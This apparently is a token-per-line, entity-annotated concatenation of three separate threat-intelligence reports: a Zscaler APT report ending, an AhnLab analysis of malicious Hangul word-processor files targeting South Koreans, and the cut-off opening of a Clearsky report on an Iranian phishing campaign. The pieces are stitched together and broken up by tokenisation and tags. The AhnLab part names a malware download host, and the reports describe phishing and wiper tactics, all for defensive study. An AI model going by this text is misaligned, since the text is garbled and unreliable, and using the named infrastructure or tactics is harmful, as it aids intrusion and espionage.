are
not
always
that
'Advanced
'
The
above
incident
reports
document
(
spear-
)
phishing
with
a
malicious
PDF
attachment
,
or
link
to
a
binary
executable
with
a
Poison
Ivy
RAT
payload
.

While
the
exploitation
used
in
some
of
the
crafted
PDF
attachments
may
be
considered
advanced
,
for
the
most
part
the
attack
is
one
of
social-engineering
.

This
is
nothing
new
and
something
that
other
fraudsters
/
criminals
have
been
leveraging
for
many
years
.

RSA
recently
wrapped
up
their
APT
summit
and
their
first
finding
concluded
that
the
'attack
vector
[
is
]
shifting
from
technology
to
people'.12

4.4
APTs
are
not
limited
to
the
United
States
Government
or
Defense
Industrial
Base

The
victim
related
to
this
report
is
neither
a
Government
agency
,
nor
an
entity
that
would
normally
be
associated
with
the
Defense
Industrial
Base
.

While
this
report
does
list
USG
(
United
State
Government
)
and
DIB
(
Defense
Industrial
Base
)
entities
as
possible
victims
,
there
are
many
more
commercial
entities
within
the
Geospatial
and
Telecommunication
industries
that
appear
to
have
been
victims
of
this
Group
.

Zscaler
has
noted
both
foreign
and
domestic
entities
that
have
been
victims
of
other
APT
incidents
as
well
.

12
.

http://www.rsa.com/summitresults B_url.normal

-Zscaler
ThreatLabZ
While
the
exploitation
used
in
some
of
the
crafted
PDF
attachments
may
be
considered
advanced
,
for
the
most
part
the
attack
is
one
of
social-engineering
.
'

4.5
APT
Information
Disclosure
Remains
a
Challenge
Incident
Information
Disclosure
is
an
extension
to
the
heated
debate
around
vulnerability
information
disclosure
,
and
full-disclosure
versus
responsible-disclosure
.

Responsible-disclosure
is
fairly
well
defined
and
adopted
within
the
vulnerability
space
,
but
it
is
not
within
the
incident
space
.

Here
are
some
arguments
for
'full
disclosure
'
of
incident
information
:
-
A
larger
community
of
awareness
(
and
thus
potential
detection
possibility
)
,
particularly
if
there
are
more
organizations
impacted
-
A
general
philosophy
that
information
should
be
public
and
that
the
Government
or
information
security
community
should
not
have
secrets
kept
from
the
public
-
The
public
should
be
made
aware
of
which
organizations
have
been
victimized
so
that
this
information
and
their
response
can
be
weighed
before
trusting
them
again
in
the
future
Here
are
some
arguments
for
'responsible
disclosure
'
(
the
selective
release
of
information
to
specific
parties
)
of
incident
information
-
Public
release
will
cause
the
attacker
to
alter
their
TTPs
and
possibly
allow
them
to
make
changes
to
infected
systems
prior
to
incident
response
action
,
making
detection
more
difficult
-
Public
release
of
information
can
be
viewed
as
attempting
to
garner
the
spotlight
for
financial
motives
versus
genuine
concerns
about
security
-
There
may
be
law
enforcement
(
or
other
)
investigations
that
are
on-going
and
such
a
release
of
information
could
compromise
the
investigation
Zscaler
adheres
to
the
following
general
principals
for
incident/
vulnerability
disclosure
:
-
Customer
specific
information
is
disclosed
only
to
the
impacted
customer

Customer
information
will
be
redacted
prior
to
public
disclosure
or
disclosure
to
other
impacted
parties
,
stake-holders
,
and
trusted
groups
within
the
information
security
community
-
Public
disclosure
will
provide
high-level
indicators
of
compromise
(
such
as
general
network
behavior
and
malicious
domains
)
without
the
release
of
specifics
as
to
which
organizations
were
impacted
and
is
done
so
when
it
is
believed
that
such
information
will
benefit
others
in
protecting
against
similar
threats
-
Based
on
feedback/approval
from
the
impacted
parties
,
stake-holders
,
and
information
security
community
-
additional
information
may
be
released
to
the
public
Zscaler
is
willing
to
share
additional
details
of
the
incidents
discussed
in
this
report
with
trusted
groups
within
the
information
security
community
to
help
further
their
research
with
regard
to
similar
incidents
.

If
you
are
interested
in
sharing
data
on
this
and
other
incidents
,
we
encourage
you
to
contact
us
at
threatlabz@zscaler.com
.

Conclusion
By
interrogating
Zscaler
's
comprehensive
logging
repository
for
anomalous
activity
and
indicators
of
compromise
,
a
Zscaler
ThreatLabZ
researcher
identified
a
high-risk
entity
victimized
by
a
possible
APT
attack
linked
to
the
'1.php
'
Group
.

The
conclusion
that
these
attacks
should
be
classified
as
an
APT
attack
are
based
on
the
following
indicators
:
-
The
victim
enterprise
is
a
high
risk
target
,
involved
in
an
industry
that
has
regularly
been
targeted
in
similar
attacks
-
Linkages
were
identified
among
several
previous
incidents
from
2010
to
present
,
showing
persistence
-
There
remains
little
to
no
open-source
information
on
the
domains
/
IPs
used
in
the
attack
,
and
the
linkage
to
open-source
reports
shows
a
correlation
with
past
APT
incidents

The
sum
of
these
indicators
has
led
to
our
conclusion
that
this
was
an
attack
performed
over
a
significant
period
of
time
that
focused
on
a
specific
target
,
given
the
sensitive
nature
of
their
work
.
'

-Zscaler
ThreatLabZ

The
RAT
payload
in
question
is
popular
among
previously
documented
APT
incidents

Some
No-IP
dynamic
DNS
domains
used
(
while
a
weak
APT
indicator
,
dynamic
DNS
domains
have
often
been
used
among
documented
APT
incidents
,
such
as
Aurora
and
Night
Dragon
)

Hostnames
related
to
victims
are
used
,
which
is
a
technique
previously
documented
in
other
APT
attacks

Nameserver
and
domain
registration
information
indicates
likely
Chinese
origin
of
attacks

VPS/hosting
servers
used
match
some
of
those
previously
used
in
alleged
APT
attacks
.

The
sum
of
these
indicators
has
led
to
our
conclusion
that
this
was
an
attack
performed
over
a
significant
period
of
time
that
focused
on
a
specific
target
,
given
the
sensitive
nature
of
their
work
.

Based
on
information
in
the
public
domain
,
it
appears
that
these
attacks
correlate
with
others
,
previously
identified
as
being
the
work
of
the
'1.php
'
Group
.

Identified
targets
of
these
attacks
include
China/US
relations
experts
,
USG
/
DIB
entities
,
and
the
Geospatial
industry
.

Based
on
the
targets
,
it
is
our
belief
that
corporate
espionage
was
the
goal
of
the
attacks
.

Open-source
reports
suggest
that
these
attacks
are
more
widespread
than
many
realize
and
that
the
same
or
similar
actors
are
compromising
numerous
organizations
in
order
to
steal
sensitive
intellectual
property
.

As
stated
within
the
Lessons
Learned
section
,
it
is
important
that
those
concerned
about
such
attacks
be
vigilant
in
their
log
collection
and
analysis
to
identify
anomalies
or
other
indications
of
compromise
.

About
Zscaler
:
The
Cloud
Security
CompanyTM

Zscaler
enforces
business
policy
,
mitigates
risk
and
provides
twice
the
functionality
at
a
fraction
of
the
cost
of
current
solutions
,
utilizing
a
multi-tenant
,
globally-deployed
infrastructure
.

Zscaler
's
integrated
,
cloud-delivered
security
services
include
Web
Security
,
Mobile
Security
,
Email
Security
and
DLP
.

Zscaler
services
enable
organizations
to
provide
the
right
access
to
the
right
users
,
from
any
place
and
on
any
device
-
all
while
empowering
the
end-user
with
a
rich
Internet
experience
.

About
Zscaler
ThreatLabZTM
ThreatLabZ
is
the
global
security
research
team
for
Zscaler
.

Leveraging
an
aggregate
view
of
billions
of
daily
web
transaction
,
from
millions
of
users
across
the
globe
,
ThreatLabZ
identifies
new
and
emerging
threats
as
they
occur
,
and
deploys
protections
across
the
Zscaler
Security
Cloud
in
real
time
to
protect
customers
from
advanced
threats
.

For
more
information
,
visit
www.zscaler.com
.
Targeted
Attacks
on
South
Korean
Organizations
Attacks
Using
Local
Word
Processor
Sep
2016
-
Dec
2017

Analysis
Research
Team
,
AhnLab
Security
Emergency
Response
Center
(
ASEC
)

Contents
Summary
........................................................................................................................................
3
Overview
.........................................................................................................................................
4
Attack
Methods
...............................................................................................................................
4
Types
of
Malicious
Hangul
Files
......................................................................................................
4
Vulnerabilities
..............................................................................................................................
5
JavaScript
...................................................................................................................................
5
Encapsulated
PostScript
(
EPS
)
...................................................................................................
6
Embedded
Objects
......................................................................................................................
6
Status
of
malicious
Hangul
document
files
......................................................................................
7
Change
in
Malware
Source
Codes
Used
in
Hangul
Document
File
Attacks
..................................
10
Attack
groups
................................................................................................................................
10
Group
A
-
Red
Eyes
..................................................................................................................
10
Group
B
.....................................................................................................................................
12
Group
C.....................................................................................................................................
13
Other
.........................................................................................................................................
15
Response
and
Prevention
.............................................................................................................
16
Reference
.....................................................................................................................................
16

Summary
Hangul
(
also
known
as
Hangul
Word
Processor
or
HWP
)
is
a
proprietary
word
processing
application
published
by
the
South
Korean
company
Hancom
Inc..
Hangul
's
specialized
support
for
the
Korean
written
language
has
gained
its
widespread
use
in
South
Korea
,
especially
by
the
government
.
Malicious
attackers
targeting
Korea
are
now
using
Hangul
files
.

This
report
is
based
on
AhnLab
's
analysis
malicious
Hangul
files
found
over
16
months
,
from
September
2016
to
December
2017
,
and
found
the
target
of
attack
to
be
mainly
employees
of
North
Korea
related
businesses
and
virtual
currency
related
business
.

The
attack
methods
using
Hangul
files
came
in
many
forms
:
exploiting
different
vulnerabilities
,
JavaScripts
,
Encapsulated
PostScripts
(
EPS
)
,
and
embedded
objects
.

Current
attacks
mainly
use
the
EPS
method
.

AhnLab
analyzed
the
problem
classifying
the
attack
groups
by
attack
target
,
attack
method
,
and
malware
.

The
attackers
can
be
divided
into
three
groups
,
and
two
of
the
three
groups
are
actively
using
Hangul
files
as
a
delivery
mechanism
.

In
the
past
,
the
attacks
using
Hangul
files
created
and
executed
a
backdoor
,
which
exploited
a
Hangul
vulnerability
on
the
user
's
computer
.

However
,
attacks
found
after
September
2016
are
mainly
executed
in
the
memory
of
a
computer
.

This
seems
to
be
a
technique
to
bypass
behavior-based
diagnostics
of
security
solutions
,
which
detect
the
creation
of
malware
in
document
files
.

Fortunately
,
there
is
no
new
malware
exploiting
Hangul
's
vulnerabilities
since
the
second
half
of
2016
.

This
means
that
the
attacker
is
exploiting
a
vulnerability
that
has
already
been
patched
so
the
users
can
prevent
attacks
by
simply
conducting
the
latest
Hangul
security
update
.

This
,
however
,
does
not
apply
to
the
embedded
object
type
of
malware
found
in
Hangul
files
.

Overview
Hangul
(
also
known
as
Hangul
Word
Processor
or
HWP
)
is
a
proprietary
word
processing
application
published
by
the
South
Korean
company
Hancom
Inc..
Hangul
's
specialized
support
for
the
Korean
written
language
has
gained
its
widespread
use
in
South
Korea
,
especially
by
the
government
and
schools
.

Thus
the
attackers
using
Hangul
as
a
method
are
those
wishing
to
target
Korean
governmental
institutions
.

AhnLab
has
analyzed
the
malicious
Hangul
files
found
from
September
2016
to
December
2017
and
summarized
the
attack
targets
,
attack
method
,
and
the
attack
groups
.

Attack
Methods

The
most
common
attack
method
is
via
email
.

An
attacker
creates
an
email
masquerading
as
content
that
would
interest
the
chosen
target
and
induces
the
target
to
open
the
Hangul
files
containing
malware
.

Either
an
attacker
can
use
the
method
of
sending
an
email
attachment
or
the
attacker
can
alternately
attempt
to
deliver
the
malware
by
adding
a
download
URL
in
the
email
.

[
Figure
1
]
Hangul
file
link
mail

Types
of
Malicious
Hangul
Files
Hangul
file
attacks
use
methods
such
as
vulnerability
exploitation
,
scripts
,
Encapsulated
PostScript
(
EPS
)
,
and
embedded
objects
,
which
will
be
discussed
in
details
below
.

An
attacker
may
use
other
executable
files
,
such
as
EXE
and
LNK
files
disguised
as
HWP
files
.

However
,
though
widely
used
,
it
is
not
considered
an
actual
Hangul
file
attack
.

[
Figure
2
]
LNK
file
disguised
as
a
Hangul
file

Vulnerabilities
An
attacker
arbitrarily
modifies
the
content
of
a
document
to
execute
malware
via
an
abnormal
behavior
.

Attack
methods
exploiting
this
vulnerability
are
not
easy
to
detect
.

Moreover
,
the
compatibility
of
the
files
are
greatly
affected
by
the
Hangul
software
version
so
sometimes
the
document
takes
a
while
to
open
or
the
document
may
not
even
be
able
to
be
opened
at
all
.

Fortunately
,
no
new
vulnerabilities
have
been
found
in
Hangul
since
the
fall
of
2016
.

JavaScript
Hancom
Office
supports
JavaScript
and
many
malware
are
written
in
JavaScript
.

Normally
,
documents
containing
scripts
ask
for
user
confirmation
before
running
the
script
.

However
,
a
vulnerability
in
which
a
script
starts
without
user
notification
was
found
in
a
2007
version
of
Hangul
.

[
Figure
3
]
Malicious
Hangul
files
containing
JavaScript

The
file
contains
data
corresponding
to
a
Windows
executable
file
in
JavaScript
and
uses
it
to
create
Windows
executable
files
.

[
Figure
4
]
Malicious
JavaScript

Encapsulated
PostScript
(
EPS
)
Encapsulated
PostScript
(
EPS
)
is
a
script
that
processes
Adobe
images
.

After
the
vulnerability
exploiting
EPS
(
CVE-2015-2545
)
was
found
in
2015
,
the
first
malicious
Hangul
files
written
in
EPS
appeared
in
September
2016
and
were
found
continuously
until
January
2018
.

[
Figure
5
]
Examples
of
attacks
using
EPS
scripts

Currently
malicious
scripts
written
in
EPS
cannot
run
in
Hangul
with
the
latest
security
update
.

However
,
attacks
using
this
vulnerability
will
continue
until
a
new
vulnerability
is
found
.

Therefore
,
users
must
apply
the
latest
security
updates
to
avoid
damage
from
EPS
scripted
attacks
.

Embedded
Objects
Object
embedding
itself
is
not
a
vulnerability
but
it
is
a
way
to
attach
executable
codes
in
a
document
and
then
induce
a
user
to
click
and
execute
it
.

It
can
be
used
by
attackers
to
disguise
malware
in
the
form
of
an
annex
within
the
document
.

There
is
also
a
type
of
document
that
uses
an
image
of
a
notification
window
as
seem
in
Figure
6
.

When
the
user
clicks
the
'OK
'
button
to
close
the
window
,
the
inserted
malware
is
executes
.

[
Figure
6
]
Malicious
Hangul
document
disguised
as
a
notification
window

Among
the
embedded
objects
,
the
executable
file
asks
the
user
whether
to
run
it
.

You
can
see
the
path
where
the
file
is
saved
through
the
notification
window
as
in
Figure
7
.

[
Figure
7
]
A
pop-up
when
running
an
executable
file
with
an
inserted
object

Status
of
malicious
Hangul
document
files

A
total
of
135
malicious
Hangul
document
files
were
collected
over
16
months
from
September
2016
to
December
2017
by
AhnLab
.

The
monthly
statistics
for
this
data
is
as
shown
in
[
Table
1
]
.

[
Table
1
]
Number
of
malicious
Hangul
document
files
detected
by
month

The
percentages
of
attacks
by
their
various
types
were
75
%
EPS
,
14
%
vulnerability
exploitation
,
7
%
object
embedding
,
and
scripts
came
in
at
4
%
.

EPS
was
the
most
used
method
.

[
Figure
8
]
Ratio
of
attack
methods
using
malicious
Hangul
files

And
the
collected
information
by
category
were
18
%
on
general
information
(
on
products
,
security
,
announcements
,
and
speech
)
,17
%
on
North
Korea
,
17
%
on
virtual
money
,
14
%
on
finance
,
and
8
%
on
resumes
.

[
Figure
9
]
Ratio
of
content
of
malicious
Hangul
files

It
seems
like
the
attacker
is
targeting
individuals
working
on
things
related
to
North
Korea
(
North
Korean
defectors
,
North
Korean
human
rights
activists
,
North
Korean
researchers
,
journalists
,
etc
.
)
.

AhnLab
analyzed
the
content
of
malicious
Hangul
document
files
,
attack
techniques
,
and
malware
source
codes
to
find
the
following
information
.

First
,
the
attackers
can
be
divided
into
three
groups
(
A
,
B
,
and
C
)
where
Group
A
(
26
%
)
and
Group
B
(
48
%
)
were
responsible
for
74
%
of
the
attacks
,
comprising
most
of
the
attacks
.

Other
than
the
three
groups
,
25
%
of
the
attacks
are
unclassified
,
meaning
that
there
could
be
more
attack
groups
revealed
upon
later
analysis
.

[
Figure
13
]
Ratio
to
attack
groups
using
malicious
Hangul
files

Change
in
Malware
Source
Codes
The
malware
that
exploits
Hangul
document
files
are
generally
'downloaders
'
that
download
other
malware
and
'backdoors
'
that
allow
remote
control
.

The
most
common
form
is
the
downloader
.

The
downloader
downloads
malware
from
a
specific
address
.

If
files
can
be
downloaded
from
a
specific
address
,
it
is
even
possible
to
replace
the
old
malware
with
new
malware
.

It
can
also
include
a
backdoor
that
can
remotely
manipulate
the
contents
of
an
infected
computer
.

In
the
past
,
it
was
common
to
create
and
run
a
backdoor
on
a
user
's
computer
using
a
vulnerability
in
Hangul
.

However
,
most
malware
found
since
September
2016
runs
only
in
the
computer
's
memory
.

This
seems
to
be
a
technique
to
bypass
behavior-based
diagnostics
of
security
solutions
which
detect
the
pattern
of
malware
in
document
files
.

We
have
also
found
cases
where
files
were
created
,
but
only
executed
when
Hangul
was
running
.

Attack
groups

In
2017
,
there
were
at
least
three
groups
using
Hangul
files
for
attacks
-note
that
classification
of
attack
groups
can
be
divided
or
merged
depending
on
the
development
of
any
new
leads
.

Among
them
,
the
attack
targets
of
the
two
groups
that
actively
used
Hangul
files
for
attack
were
clear
.

Group
A
-
Red
Eyes

Group
A
is
also
known
as
Red
Eyes
,
Group
123
,
ScarCurf
,
APT37
,
Reaper
,
and
Ricochet
Chollima
.

From
the
analysis
results
,
it
was
deemed
that
the
main
target
of
this
group
are
individuals
working
in
the
fields
related
to
North
Korea
,
such
as
North
Korean
defectors
,
North
Korean
human
rights
activists
,
North
Korean
researchers
,
and
journalists
.

In
addition
,
documents
related
to
the
military
were
included
in
attack
cases
.

The
names
of
the
malicious
Hangul
file
used
in
this
attack
group
are
as
follows
:

[
Table
2
]
Malicious
Hangul
document
file
names
used
in
attacks
by
Group
A

This
group
created
malware
using
the
first
EPS
in
September
2016
.

The
Hangul
document
,
disguised
as
a
North
Korean
New
Year
Address
for
January
2017
,
is
in
the
form
of
an
embedded
object
.

Information
about
malware
creators
can
be
gained
using
the
document
.

For
example
,
looking
at
the
file
path
'C
:
\Users\pad-2\AppData\Local\Temp\Hwp
(
3).exe
'
for
object
insertion
,
we
can
find
that
the
name
of
the
malware
as
'\\192.168.100.22\saggazi\Happy\Work\2016.8~2016.8.10~
'
,
we
can
find
the
Korean
word
'saggazi
,
'
indicating
that
the
creator
may
be
Korean
or
someone
familiar
with
Korean
.

We
are
tracking
malware
produced
by
the
same
group
through
related
strings
.

[
Figure
14
]
Malware
maker
information
contained
in
a
malicious
Hangul
document
file

In
late
October
2017
,
the
same
group
used
Microsoft
Word
's
Dynamic
Data
Exchange
(
DDE
)
document
file
for
an
attack
.

In
April
2017
,
this
attack
group
released
a
Hangul
file
with
a
malware
to
destroy
hard
disks
.

When
the
malware
is
executed
,
it
destroys
the
content
of
the
hard
disk
,
reboots
,
and
displays
only
a
message
that
reads
'Are
you
Happy
?
'
.

[
Figure
15
]
Booting
screen
after
hard
disk
destruction

Malware
of
this
attack
group
contains
a
character
string
that
is
a
typical
program
database
(
PDB
)
file
format
.

Through
this
PDB-related
string
,
we
can
guess
the
attacker
's
malware
version
and
malware
type
.

[
Figure
16
]
PDB
contents
by
version

This
attack
group
was
known
for
an
attack
using
a
zero-day
flash
file
at
the
end
of
January
2018
.

They
are
a
new
group
in
the
center
of
attention
since
a
report
was
published
on
the
group
in
February
2018
.

Group
B

Group
B
is
believed
to
be
the
group
associated
with
the
2014
Sony
Pictures
hacking
.

Since
2014
,
this
group
has
attacked
defense
industries
and
large
corporations
in
Korea
,
and
is
focused
on
attacking
virtual
money
exchanges
and
virtual
currency-related
laboratories
in
2017
.

It
impersonated
a
financial
committee
as
well
as
an
attorney
general
,
etc.
,
and
disguised
important
files
as
the
preparatory
documents
of
a
tax
investigation
,
transactions
of
suspected
corporate
body
,
and
other
content
relevant
to
an
investigation
.

[
Table
3
]
Malicious
document
file
names
used
in
the
attacks
of
Group
B

This
group
mainly
used
EPS
,
but
the
scripting
method
is
quite
different
compared
to
Group
A
.

[
Figure
17
]
Malicious
EPS
used
by
Group
B

Group
C

In
Group
C
,
only
the
Hangul
file
in
an
object
embedded
type
was
found
in
June
of
2017
.

However
,
analysis
of
the
embedded
executable
file
shows
that
there
are
more
than
40
variants
and
that
they
have
been
active
since
July
2015
.

Malware
is
embedded
as
an
object
in
the
Hangul
document
file
,
and
when
the
user
clicks
it
,
the
downloader
runs
and
downloads
additional
malware
from
http://endlesspaws.com/sitemap.tar.gz B_url.cncsvr
.

At
the
same
time
,
it
downloads
the
normal
Hangul
file
from
http://endlesspaws.com/dump.sql B_url.normal
and
displays
the
contents
of
the
'
annex.hwp
'
file
so
that
the
user
does
not
know
about
the
malware
infection
.

[
Figure
17
]
is
the
downloaded
'annex.hwp
'
,
which
contains
the
content
from
a
North
Korean
human
rights
civilian
organization
activity
support
project
.

Also
,
the
object
embedded
Hangul
file
shows
that
the
user
name
of
the
malware
maker
is
'easy
.
'

[
Figure
18
]
Information
of
the
maker
in
a
malicious
Hangul
document
file

After
the
analysis
of
the
downloader
variants
,
the
name
of
the
Hangul
file
to
download
is
shown
in
[
Table B_malware.drop
4 I
]
.

[
Table B_malware.drop
4 I
]
Names
of
download
files
used
for
attack
by
Group
C

Approximately
25
backdoor
variants
downloaded
by
the
downloader
have
been
identified
and
were
first
found
in
July
2015
.

The
file
names
of
the
backdoors
are
shown
in
[
Table B_malware.backdoor
5 I
]
.

[
Table B_malware.backdoor
5 I
]
Names
of
backdoor
file
used
for
attack
by
Group
C

Group
C
uses
Mutex
as
a
downloader
and
a
backdoor
as
shown
in
[
Table
6
]
.

[
Table
6
]
Mutex
used
in
malware
in
Group
C
attacks

The
target
of
the
attack
is
identified
as
a
North
Korean
human
rights
group
for
now
.

However
,
we
can
not
identify
specific
attack
targets
as
we
could
not
check
other
Hangul
files
.

Group
C
seems
to
be
different
from
Group
A
so
far
,
but
if
the
main
target
of
this
group
is
North
Korea
related
workers
,
association
with
Group
A
can
not
be
excluded
.

Other
In
November
2017
,
a
Hangul
file
contained
Ursnif B_malware.infosteal
,
a
financial
information
hijacking
malware
,
was
also
found
.

For
documents
containing
Ursnif B_malware.infosteal
variants
,
the
username
was
the
name
of
a
famous
Korean
company
,
and
the
path
to
the
object
was
C
:
\Users\User
Name\Desktop\DuranDuran\Sample\patch39.exe
.

[
Figure
19
]
File
path

Response
and
Prevention
AhnLab
's
world
recognized
anti-malware
solution
V3
diagnoses
Hangul
malware
.

The
aliases
identified
by
AhnLab
V3
are
as
below
:
EPS/Cve-2015-2545
(
2016.11.30.00
)
EPS/Dropper.Gen
(
2017.06.15.00
)
EPS/Exploit
(
2017.11.23.00
)
HWP/Cve-2015-2545
(
2016.01.07.00
)
HWP/Dropper
(
2017.01.04.00
)
HWP/Exploit
(
2015.08.01.00
)
HWP/Exploit-PT.Gen
(
2010.09.29.00
)
HWP/Malinker
(
2017.06.10.00
)
In
the
viewpoint
of
attackers
targeting
Korean
users
,
Hangul
files
are
truly
appealing
.

Therefore
,
users
should
apply
the
latest
update
in
order
to
avoid
damages
.

In
addition
,
when
opening
a
Hangul
document
,
users
should
be
careful
about
the
executable
files
that
are
embedded
inside
,
such
as
links
,
images
,
movies
,
and
documents
.

Attackers
have
been
exploiting
various
methods
of
attack
over
the
past
decade
.

Fortunately
,
there
is
no
new
vulnerability
to
exploit
and
use
to
attack
by
modifying
a
Hangul
document
file
.

However
,
attacks
aiming
domestic
users
such
as
Hangul
attacks
will
steadily
continue
.

Reference
[
1
]
Korean
MalDoc
Drops
Evil
New
Years
Presents
(
http://blog.talosintelligence.com/2017/02/korean-maldoc.html B_url.normal
)
[
2
]
Introducing
ROKRAT
(
http://blog.talosintelligence.com/2017/04/introducing-rokrat.html B_url.normal
)
[
3
]
ROKRAT
Reloaded
(
http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html B_url.normal
)
[
4
]
Korea
In
The
Crosshairs
(
http://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html B_url.normal
)
[
5
]
Flash
0-Day
In
The
Wild
:
Group
123
At
The
Controls
(
http://blog.talosintelligence.com/2018/02/group-123-goes-wild.html B_url.normal
)
[
6
]
APT37
research/2018/02/apt37-overlooked-north-korean-actor.html
)
(
Reaper
)
:
The
Overlooked
North
Korean
Actor
(
https://www.fireeye.com/blog/threat B_url.normal
June
2015

Thamar
Reservoir

An
Iranian
cyber-attack
campaign
against
targets
in
the
Middle
East

Clearsky

TLP
:
WHITE
For
public
distribution

Contents
Foreword
..............................................................................................................................................................
3
Modus
operandi
-
investigation
of
targeted
attacks
............................................................................................
4
Part
1
-spear
phish
#
1
-
with
malware
.........................................................................................................
4
Part
2
-
phone
calls
to
victims
......................................................................................................................
5
Part
3
-
spear
phishing
#
2
............................................................................................................................
5
Part
4
-
breaking
into
an
Israeli
research
institute
to
set
up
phising
page
#
3
.............................................
7
Part
5
-
spear
phishing
#
4
............................................................................................................................
9
Part
6
-
Abusing
account
recovery
mechanisms
........................................................................................10
Part
7
-
Private
messages
...........................................................................................................................10
Targets
and
further
incidents
.............................................................................................................................12
Targets
............................................................................................................................................................12
Further
incidents
............................................................................................................................................13
The
Iranian
connection
.......................................................................................................................................14
Malware
analysis
................................................................................................................................................15
Macro
.............................................................................................................................................................15
tmp.bat
...........................................................................................................................................................16
NTUSER.dat{GUID}.exe
...................................................................................................................................16
CWoolger
Keylogger
.......................................................................................................................................16
Technical
indicators
and
IoC
...............................................................................................................................18
Domains
.........................................................................................................................................................18
IPs
...................................................................................................................................................................18
Malware
.........................................................................................................................................................18
Malicious
Email
accounts
...............................................................................................................................18

Foreword

This
report
reviews
an
ongoing
cyber-attack
campaign
dating
back
to
mid-2014
.

Additional
sources
indicate
this
campaign
may
date
as
far
back
as
2011
.

We
call
this
campaign
Thamar
Reservoir
,
named
after
one
of
the
targets
,
Thamar
E.
Gindin1
,
who
exposed
new
information
about
the
attack
and
is
currently
assisting
with
the
investigation
.

The
campaign
includes
several
different
attacks
with
the
aim
of
taking
over
the
target
's
computer
or
gain
access
to
their
email
account
.

We
estimate
that
this
access
is
used
for
espionage
or
other
nation-state
interests
,
and
not
for
monetary
gain
or
hacktivism
.

In
some
cases
,
the
victim
is
not
the
final
target
;
the
attackers
use
the
infected
computer
,
email
,
or
stolen
credentials
as
a
platform
to
further
attack
their
intended
target
.

The
attackers
are
extremely
persistent
in
their
attempts
to
breach
their
targets
.

These
attempts
include
:

Breaching
trusted
websites
to
set
up
fake
pages

Multi-stage
malware

Multiple
spear
phishing
emails
based
on
reconnaissance
and
information
gathering
.


Phone
calls
to
the
target
.


Messages
on
social
networks
.

While
very
successful
in
their
attacks
,
the
attackers
are
clearly
not
technically
sophisticated
.

They
are
not
new
to
hacking
,
but
do
make
various
mistakes
,
such
as
grammatical
errors
,
exposure
of
attack
infrastructure
,
easy
to
bypass
anti
analysis
techniques
,
lack
of
code
obfuscation
,
and
more
.

These
mistakes
enabled
us
to
learn
about
their
infrastructure
and
methods
.

More
importantly
,
we
have
learned
of
550
targets
,
most
of
them
in
the
Middle
East
,
from
various
fields
:
research
about
diplomacy
,
Middle
East
and
Iran
,
international
relations
,
and
other
fields
;
Defense
and
security
;
Journalism
and
human
rights
;
and
more
.

Various
characteristics
of
the
attacks
and
their
targets
bring
us
to
the
conclusion
that
the
threat
actors
are
Iranian
.

In
addition
,
we
note
that
these
attacks
share
characteristics
with
previously
documented
activities
:

Attacks
conducted
using
the
Gholee B_malware.infosteal
malware
,
which
we
discovered
.


Attacks
reported
by
Trend
Micro
in
Operation
Woolen-Goldfish
.


Attacks
conducted
by
the
Ajax
Security
Team
as
documented
by
FireEye
.

Attacks
seen
during
Newscaster
as
documented
by
iSight
.

For
further
details
and
questions
,
or
if
you
think
you
are
a
victim
please
contact
us
at
:
info
[
at
]
clearskysec.com B_url.normal
1
Dr
.

Gindin
is
an
expert
on
Iranian
linguistics
and
Pre-Islamic
Iran
,
renowned
lecturer
and
research
fellow
at
the
Ezri
Center
for
Iran
and
Persian
Gulf
Research
in
the
University
of
Haifa
.

http://www.thmrsite.com/?page_id=198 B_url.normal

Modus
operandi
-
investigation
of
targeted
attacks

This
chapter
contains
an
in-depth
analysis
of
a
series
of
attacks
against
one
of
the
Thamar
Reservoir
targets
.

The
heavy
attack
began
two
days
after
the
target
,
Dr
.

Thamar
E.
Gindin
,
was
interviewed
on
the
IDF
radio
station2
.

Over
the
course
of
two
weeks
,
the
threat
actor
used
the
following
attacks
against
a
single
target
:
1
.

One
spear
phishing
email
containing
malware
.

2
.

Three
separate
email
messages
with
links
to
a
fake
log-in
page
,
(
including
two
factor
authentication
)
,
one
of
them
hosted
on
a
breached
website
,
the
other
two
on
dedicated
domains
.

3
.

Two
phone
calls
from
the
attacker
,
designed
to
build
rapport
for
one
of
the
phishing
emails
.

4
.

Numerous
attempts
to
take
over
cloud
accounts
using
their
Account
Recovery
mechanism
.

5
.

Numerous
messages
on
Facebook
and
by
e-mail
.

While
we
describe
this
case
mostly
from
the
point
of
view
of
a
single
target
,
we
would
like
to
emphasize
that
these
scenarios
repeated
themselves
for
many
other
targets
.

Part
1
-spear
phish
#
1
-
with
malware

In
May
2015
a
legitimate
email
was
sent
asking
several
researchers
to
fill
out
a
form
that
was
sent
as
a
Word
document
.

The
attackers
obtained
this
correspondence
,
presumably
by
breaching
the
email
account
of
the
sender
.

They
created
a
new
Gmail
account
with
a
username
similar
to
that
of
the
original
sender
.

Then
,
they
sent
the
recipients
a
follow-up
message
(
including
the
initial
correspondence
)
,
asking
them
to
fill
up
the
attached
form
again
.

This
time
,
the
attachment
was
a
weaponized
Microsoft
Excel
file
(
The
file
is
analyzed
in
the
'Malware
analysis
'
chapter
of
this
report
)
.

In
other
cases
the
attackers
used
the
same
methods
-
sending
malware
or
phishing
from
a
cloud
email
service
(
such
as
Gmail
or
Hotmail
)
using
a
username
similar
to
that
used
by
one
of
the
target
's
acquaintances
.

The
malicious
email
was
written
in
the
original
language
of
the
correspondence
-
Hebrew
.

But
it
is
clear
that
the
attackers
do
not
know
Hebrew
,
as
they
made
grammatical
errors
in
the
few
words
they
have
added
to
it
(
the
rest
were
copied
from
the
original
email
)
.

Other
messages
,
in
English
and
Farsi
,
were
analyzed
by
several
specialists3and
were
determined
to
have
been
written
by
a
native
Iranian
Persian
speaker
.

2
The
interview
revolved
around
'her
own
way
to
being
a
linguist
and
an
Iranist
,
and
promoting
her
books
'The
Good
,
the
Bad
and
the
World
-
a
Journey
to
Pre-Islamic
Iran
'
and
'The
Book
of
Esther
,
Unmasked
'
'
.

3Three
of
the
targets
are
Iran
and
the
Middle
East
researchers
,
and
two
of
them
are
native
Farsi
speakers
.

Going
through
numerous
messages
they
have
received
,
and
in
one
case
a
phone
call
-
they
have
determined
that
the
writer/speaker
is
native
in
Iranian
Persian
.

Below
is
an
example
of
another
case
(
the
email
includes
the
professional
signature
of
the
impersonated
sender
)
:

Part
2
-
phone
calls
to
victims

A
week
later
,
the
attackers
called
the
target
's
office
number
.

The
office
manager
,
who
received
the
call
,
later
said
that
someone
with
'bad
English
'
had
asked
to
schedule
an
interview
.

The
attackers
later
called
the
target
's
personal
